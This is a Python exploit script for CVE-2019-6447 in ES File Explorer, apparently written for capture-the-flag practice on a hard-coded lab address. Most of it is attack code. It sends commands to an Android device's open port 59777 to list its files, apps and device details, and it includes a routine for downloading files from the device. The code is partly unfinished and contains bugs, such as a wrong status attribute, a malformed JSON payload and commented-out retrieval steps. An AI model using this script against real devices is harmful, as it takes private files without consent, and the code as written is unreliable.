
import requests
import sys
import os
import argparse
import json
import re

##################################################################################################
#   Python script for retrieving files, apps, and device information from an Android device
#   Android device must be running ES File Server 
#   This script relies on the ES File Server vulnerability (CVE-2019-6447)
#
#   This script is used for penetration testing purposes on deliberately vulnerable machines
#   on sites such as HackTheBox and TryHackMe
#
#   This script is loosely based on the following scripts, cited below:
#   
#
#   
#   https://github.com/fs0c131y/ESFileExplorerOpenPortVuln/blob/master/poc.py
#   
#   and
#   
#
#   https://www.exploit-db.com/exploits/50070
#
#
##################################################################################################



cmd_options = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','listAppsThumbnail','getDeviceInfo']
get_file_options = ['getFile']

post_headers = {"Content-Type": "application/json"}

addr='10.10.10.247'

url='http://'+ addr + ':59777'

total_filelist = []

formatted_json_response = ""
json_obj = dict()

### Python split() to remove square brackets at start and end of string, used for correct formatting so that the string can be parsed by json.loads without error
### Splits string using delimiter [ and takes the element at position 1 (everything after opening square bracket "[")
### And then splits string again using same technique, but this time with element at position 0 because the closing square bracket is trailing the rest of the string
def format_json(json_response):
    formatted_json = json_response.replace("\'", "\"")
    formatted_json = formatted_json.split("[")[1].split("]")[0]
    formatted_json = re.sub(',\s+}', '}', formatted_json)
    formatted_json = "[" + formatted_json +"]" 
    return formatted_json

def fetch_android_file(machine_name, filename):
    res = requests.get(url + '/' + filename)
    retrieved_file = machine_name + '_' + filename
    if res.status == 200:
        with open(retrieved_file, 'wb') as f:
            f.write(res.content)


def get_all_files(file_list):
    for file_elem in file_list:
        if file_elem["type"] == "file":
            filename = file_elem["name"]
            print("file:", filename)
            #fetch_android_file(filename)
        else:
            print("Not a valid file")



def setup_options():
    parser = argparse.ArgumentParser(description='Retrieve files from an Android device, exploiting the ES File Explorer vulnerability (CVE-2019-6447)')
    parser.add_argument('-cmd', nargs=1, choices=cmd_options, default=cmd_options[0], help='The command to be executed on the ES File Explorer')
    #parser.add_argument('cmd_get', nargs=1, choices=get_file_options, help='Retrieve individual file or all files on Android device')
    #parser.add_argument('ip', dest='addr', help='IP address of target machine')
    parser.add_argument('-ip', nargs='?', default=addr,  help='IP address of target machine')
    subparsers = parser.add_subparsers()
    subparser_get_file = subparsers.add_parser('getFile')
    subparser_get_file.add_argument('-file', type=int, nargs='?',  help='Index number of file to retrieve from generated list of all files on target device')
    #subparser_get_file.set_defaults(func=get_all_files)
    args = parser.parse_args()
    #get_file_args = subparser_get_file.args()
    #return args, get_file_args
    return args

def basic_command():
    args = setup_options()
    #args, get_file_args = setup_options()
    #cmd=args.cmd[0]
    cmd=args.cmd
    getfile_cmd=args.file
    payload_data = '{"command":' + cmd + '}'
    print("args:", args)
    print("cmd:", cmd)
    #print("Get file args:", get_file_args)
    print("Get file args:", getfile_cmd)

    if cmd == 'listFiles':
        print("listFiles command successfully received")
        res = requests.post(url, headers=post_headers, data=payload_data)
        if res and res.status_code == 200: 
            with open("file_list.txt",'wb') as f:
                res_text=res.text
               
                ### Referencing this StackOverflow article for formatting of sanitized JSON to be passed to JSON parser with json.loads:
                ###
                ### https://stackoverflow.com/questions/39491420/python-jsonexpecting-property-name-enclosed-in-double-quotes
                
                formatted_json_response = format_json(res_text)
                
                json_obj=json.loads(formatted_json_response)
                
                print("type of json_obj", type(json_obj), "\n")
                print("formatted json response using json.loads: ", json_obj, "\n")
                
                formatted_json_bytearray=formatted_json_response.encode("utf-8") 
                f.write(formatted_json_bytearray)
    #if cmd == "getFile":
    if getfile_cmd:
        #total_filelist="file_list.txt"
        ##total_filelist=dict(formatted_json_response)
        ##total_filelist=formatted_json_response
        total_filelist=json_obj
        ##with open("file_list.txt", "r") as f:
        ##    lines=f.read.splitlines()
        ##    for line in lines:
                #new_filelist_line=line.strip("\n\n")
        ##        new_filelist_line=line
        ##        print("newfile_list line:", new_filelist_line)
        ##        with open("only_files.txt", "w") as only_f:
        ##            only_f.write(new_filelist_line)
            
            #total_filelist = [line.rstrip() for line in f]
            #with open("only_files.txt", "w") as only_f:
            #    for elem in total_filelist:
            #        only_f.write(elem)
        print("All files and folders on target device: ", total_filelist)
        print("type of total_filelist", type(total_filelist), "\n")
        print("Which file(s) would you like to retrieve?")
        filelist=[file_elem for file_elem in total_filelist if (file_elem["type"] == "file")]
        print("Filelist: ", filelist)
        #file_index = int(input())
        ##print("file index chosen: ", file_index)



if __name__ == '__main__':
    basic_command()
